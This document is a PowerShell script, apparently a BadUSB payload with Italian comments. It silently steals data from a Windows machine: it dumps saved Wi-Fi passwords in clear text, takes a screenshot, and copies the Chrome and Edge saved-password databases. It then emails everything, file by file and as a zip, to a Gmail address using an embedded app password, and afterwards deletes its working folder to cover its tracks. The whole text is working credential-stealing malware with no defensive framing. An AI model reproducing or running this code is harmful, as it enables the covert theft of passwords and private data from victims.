$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Drawing.Imaging

$hostName = $env:COMPUTERNAME -replace '[^\w]','_'
$date = Get-Date -Format "yyyyMMdd_HHmm"
$ramDir = "$env:TEMP\ghost_$([guid]::NewGuid())"
$zipFile = "$ramDir\$hostName`_$date.zip"
New-Item -ItemType Directory -Path $ramDir -Force | Out-Null

# === I TUOI DATI EMAIL (Gmail) ===
$EmailFrom   = "MacGyvernumberone@gmail.com"
$EmailTo     = "MacGyvernumberone@gmail.com"   
$AppPassword = "pyrh yvfp pnab vcpm"          
$Subject     = "BadUSB Dump - $hostName - $date"

# === FUNZIONE INVIO EMAIL CON ALLEGATO ===
function Send-Email($file) {
    if(Test-Path $file) {
        $smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)
        $smtp.EnableSsl = $true
        $smtp.Credentials = New-Object Net.NetworkCredential($EmailFrom, $AppPassword)
        $msg = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, "Dump da $env:USERNAME@$hostName")
        $msg.Attachments.Add($file)
        $smtp.Send($msg)
    }
}

# === 1. Wi-Fi passwords ===
netsh wlan show profiles | Select-String "\:(.+)$" | %{
    $n = $_.Matches.Groups[1].Value.Trim()
    $k = (netsh wlan show profile name="$n" key=clear) | Select-String "Contenuto chiave|Key Content" | %{$_.ToString().Split(':')[-1].Trim()}
    "$n : $k" | Out-File "$ramDir\wifi.txt" -Append -Encoding UTF8
}

# === 2. Screenshot ===
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$b.Size)
$scr = "$ramDir\screen.jpg"
$bmp.Save($scr, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()

# === 3. Browser passwords (Chrome + Edge) ===
@('Chrome','Edge') | %{
    $path = if($_ -eq 'Chrome'){"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"} 
            else {"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
    if(Test-Path $path){ Copy-Item $path "$ramDir\$_.db" -Force }
}

# === 4. Invio immediato di quello che c’è ===
Get-ChildItem $ramDir -File | % { Send-Email $_.FullName }

# === 5. ZIP finale e invio dopo 30 secondi (per dare tempo al resto) ===
Start-Sleep -Seconds 30
Compress-Archive -Path "$ramDir\*" -DestinationPath $zipFile -Force
Send-Email $zipFile

# === 6. Pulizia ===
Start-Sleep -Seconds 10
Remove-Item $ramDir -Recurse -Force -ErrorAction SilentlyContinue




